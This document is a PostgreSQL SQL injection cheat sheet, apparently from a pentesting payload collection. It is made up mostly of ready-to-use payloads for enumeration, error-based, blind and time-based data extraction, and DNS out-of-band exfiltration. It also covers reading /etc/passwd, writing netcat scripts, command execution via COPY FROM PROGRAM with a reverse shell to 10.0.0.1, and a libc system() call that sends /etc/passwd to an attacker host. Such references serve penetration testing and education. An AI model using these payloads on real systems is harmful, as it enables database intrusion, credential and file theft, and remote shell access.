# PostgreSQL Injection

> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.


## Summary

* [PostgreSQL Comments](#postgresql-comments)
* [PostgreSQL Enumeration](#postgresql-enumeration)
* [PostgreSQL Methodology](#postgresql-methodology)
* [PostgreSQL Error Based](#postgresql-error-based)
    * [PostgreSQL XML Helpers](#postgresql-xml-helpers)
* [PostgreSQL Blind](#postgresql-blind)
    * [PostgreSQL Blind With Substring Equivalent](#postgresql-blind-with-substring-equivalent)
* [PostgreSQL Time Based](#postgresql-time-based)
* [PostgreSQL Out of Band](#postgresql-out-of-band)
* [PostgreSQL Stacked Query](#postgresql-stacked-query)
* [PostgreSQL File Manipulation](#postgresql-file-manipulation)
    * [PostgreSQL File Read](#postgresql-file-read)
    * [PostgreSQL File Write](#postgresql-file-write)
* [PostgreSQL Command Execution](#postgresql-command-execution)
    * [Using COPY TO/FROM PROGRAM](#using-copy-tofrom-program)
    * [Using libc.so.6](#using-libcso6)
* [PostgreSQL WAF Bypass](#postgresql-waf-bypass)
    * [Alternative to Quotes](#alternative-to-quotes)
* [PostgreSQL Privileges](#postgresql-privileges)
    * [PostgreSQL List Privileges](#postgresql-list-privileges)
    * [PostgreSQL Superuser Role](#postgresql-superuser-role)
* [References](#references)


## PostgreSQL Comments

| Type                | Comment |
| ------------------- | ------- |
| Single-Line Comment | `--`    |
| Multi-Line Comment  | `/**/`  |


## PostgreSQL Enumeration

| Description            | SQL Query                               |
| ---------------------- | --------------------------------------- |
| DBMS version           | `SELECT version()`                      | 
| Database Name          | `SELECT CURRENT_DATABASE()`             |
| Database Schema        | `SELECT CURRENT_SCHEMA()`               |
| List PostgreSQL Users  | `SELECT usename FROM pg_user`           |
| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |
| List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |
| Current User           | `SELECT user;`                          |
| Current User           | `SELECT current_user;`                  |
| Current User           | `SELECT session_user;`                  |
| Current User           | `SELECT usename FROM pg_user;`          |
| Current User           | `SELECT getpgusername();`               |


## PostgreSQL Methodology

| Description            | SQL Query                                    |
| ---------------------- | -------------------------------------------- |
| List Schemas           | `SELECT DISTINCT(schemaname) FROM pg_tables` |
| List Databases         | `SELECT datname FROM pg_database`            | 
| List Tables            | `SELECT table_name FROM information_schema.tables` |
| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |
| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |


## PostgreSQL Error Based

| Name         | Payload         |
| ------------ | --------------- |
| CAST | `AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -` |
| CAST | `AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -` |
| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |
| CAST | `AND (SELECT version())::int=1 -- -` |



```sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
```

```sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

### PostgreSQL XML Helpers

```sql
SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
```

The `query_to_xml` above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](#postgresql-error-based) technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.

```sql
SELECT database_to_xml(true,true,''); -- dump the current database to XML
SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
```

Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.


## PostgreSQL Blind

### PostgreSQL Blind With Substring Equivalent

| Function    | Example                                         |
| ----------- | ----------------------------------------------- | 
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        | 
| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` | 

Examples:

```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
```


## PostgreSQL Time Based

#### Identify Time Based

```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

#### Database Dump Time Based

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

#### Table Dump Time Based

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

#### Columns Dump Time Based

```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
```

```sql
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL Out of Band

Out-of-band SQL injections in PostgreSQL relies on the use of functions that can interact with the file system or network, such as `COPY`, `lo_export`, or functions from extensions that can perform network actions. The idea is to exploit the database to send data elsewhere, which the attacker can monitor and intercept. 

```sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```


## PostgreSQL Stacked Query

Use a semi-colon "`;`" to add another query

```sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
```


## PostgreSQL File Manipulation

### PostgreSQL File Read

NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions (as of [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.

* Using `pg_read_file`, `pg_ls_dir`

    ```sql
    select pg_ls_dir('./');
    select pg_read_file('PG_VERSION', 0, 200);
    ```

* Using `COPY`

    ```sql
    CREATE TABLE temp(t TEXT);
    COPY temp FROM '/etc/passwd';
    SELECT * FROM temp limit 1 offset 0;
    ```

* Using `lo_import`

    ```sql
    SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
    SELECT lo_get(16420); -- use the OID returned from the above
    SELECT * from pg_largeobject; -- or just get all the large objects and their data
    ```


### PostgreSQL File Write

* Using `COPY`

    ```sql
    CREATE TABLE nc (t TEXT);
    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
    SELECT * FROM nc;
    COPY nc(t) TO '/tmp/nc.sh';
    ```

* Using `COPY` (one-line)

    ```sql
    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
    ```

* Using `lo_from_bytea`, `lo_put` and `lo_export`

    ```sql
    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
    ```


## PostgreSQL Command Execution

### Using COPY TO/FROM PROGRAM

Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.

```sql
COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```


### Using libc.so.6

```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```


## PostgreSQL WAF Bypass

### Alternative to Quotes

| Payload            | Technique |
| ------------------ | --------- |
| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |
| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |


## PostgreSQL Privileges

### PostgreSQL List Privileges

Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.

```sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

### PostgreSQL Superuser Role

```sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

## References

- [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
- [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - Leon Juranic - June 17, 2009](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)
- [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
- [Postgres SQL Injection Cheat Sheet - @pentestmonkey - August 23, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
- [PostgreSQL 9.x Remote Command Execution - dionach - October 26, 2017](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
- [SQL Injection /webApp/oma_conf ctx parameter - Sergey Bobrov (bobrov) - December 8, 2016](https://hackerone.com/reports/181803)
- [SQL Injection and Postgres - An Adventure to Eventual RCE - Denis Andzakovic - May 5, 2020](https://pulsesecurity.co.nz/articles/postgres-sqli)
